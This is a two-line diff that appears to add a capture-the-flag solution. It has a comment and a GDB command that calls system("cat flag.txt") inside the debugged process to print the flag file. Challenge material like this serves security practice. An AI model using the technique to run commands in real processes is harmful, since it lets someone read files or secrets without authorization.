@@ -1,0 +1,2 @@
+# Yep, it is that easy
+set $a=system("cat flag.txt")
